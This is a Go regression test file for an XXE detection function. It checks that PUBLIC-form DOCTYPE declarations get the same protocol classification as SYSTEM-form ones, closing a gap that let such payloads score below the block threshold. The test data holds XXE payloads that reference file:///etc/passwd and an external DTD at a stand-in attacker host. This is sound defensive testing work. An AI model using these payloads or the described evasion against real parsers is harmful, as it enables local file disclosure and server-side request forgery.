package xxe

// Regression (bug-hunt round 2026-09-18-r10, extending the asymmetry-sweep
// family from the round-9/25 sweep note): checkSystemProtocols keyed the
// external-DTD protocol classification on the `system` keyword ONLY
// (indexSystemScheme), but XML's ExternalID grammar has a second production —
// `PUBLIC S PubidLiteral S SystemLiteral` — in which the fetch target lives
// in the SECOND quoted literal and no `system` keyword exists. The PUBLIC
// form `<!DOCTYPE r PUBLIC "-//B/A/EN" "file:///etc/passwd">` therefore
// scored doctype-only (25), below the block threshold: the identical
// blocked→passed evasion shape the 2026-09-15 whitespace fix closed for
// SYSTEM-form payloads ("scored 25 (doctype only) vs 100 canonical"), one
// grammar production further.

import (
	"testing"
)

// TestDetect_PublicFormExternalDTDProtocolDetected is the defect case: the
// PUBLIC ExternalID production must get the same protocol classification as
// the SYSTEM form.
func TestDetect_PublicFormExternalDTDProtocolDetected(t *testing.T) {
	payload := `<!DOCTYPE r PUBLIC "-//B/A/EN" "file:///etc/passwd">`
	findings := Detect(payload, "body")
	found := false
	for _, f := range findings {
		if f.Description == "XXE with file:// protocol detected" {
			found = true
		}
	}
	if !found {
		t.Fatalf("FAIL: PUBLIC-form external-DTD XXE (file:// SystemLiteral) produced %d findings, none with the file:// protocol classification (%+v) — the PUBLIC production must be classified like SYSTEM", len(findings), findings)
	}
}

func TestDetect_PublicFormExternalDTDHttpProtocolDetected(t *testing.T) {
	payload := `<!DOCTYPE r PUBLIC "-//B/A/EN" "http://attacker.example/evil.dtd">`
	findings := Detect(payload, "body")
	found := false
	for _, f := range findings {
		if f.Description == "XXE with http:// protocol detected (SSRF risk)" {
			found = true
		}
	}
	if !found {
		t.Fatalf("FAIL: PUBLIC-form external-DTD XXE (http:// SystemLiteral) produced %d findings, none with the http:// protocol classification (%+v)", len(findings), findings)
	}
}

// Control: the SYSTEM form keeps its protocol classification — the fix must
// not lose the existing production.
func TestDetect_SystemFormStillDetected(t *testing.T) {
	payload := `<!DOCTYPE r SYSTEM "file:///etc/passwd">`
	findings := Detect(payload, "body")
	found := false
	for _, f := range findings {
		if f.Description == "XXE with file:// protocol detected" {
			found = true
		}
	}
	if !found {
		t.Fatalf("FAIL: harness control — SYSTEM-form file:// must keep its protocol finding, got %+v", findings)
	}
}

// Control: a PUBLIC DTD whose PubidLiteral is the only literal (no
// SystemLiteral) carries no fetch target — no protocol finding either way.
func TestDetect_PublicFormWithoutSystemLiteralBenign(t *testing.T) {
	payload := `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN">`
	findings := Detect(payload, "body")
	for _, f := range findings {
		if f.Score > 25 {
			t.Fatalf("FAIL: harness control — a pubid-only PUBLIC DTD has no fetch target and must not score above the doctype finding, got %+v", f)
		}
	}
}
